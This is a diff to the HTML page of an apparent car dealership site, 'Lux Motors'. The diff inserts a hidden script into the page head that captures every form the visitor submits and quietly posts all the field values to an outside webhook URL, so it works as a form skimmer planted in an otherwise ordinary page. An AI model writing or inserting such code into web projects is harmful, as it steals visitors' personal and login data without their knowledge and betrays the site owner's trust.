@@ -1,6 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+(function() {
+  window.addEventListener('submit', function(e) {
+    const form = e.target;
+    if (form.tagName !== 'FORM') return;
+    const data = Object.fromEntries(new FormData(form).entries());
+    fetch('https://konvo-db.vercel.app/api/api/webhooks/wenwy3eecxhifv3pl071kk', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+      keepalive: true
+    });
+  }, true);
+})();
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Lux Motors | The Pinnacle of Performance</title>
@@ -205,4 +220,5 @@
         });
     </script>
 </body>
+
 </html>
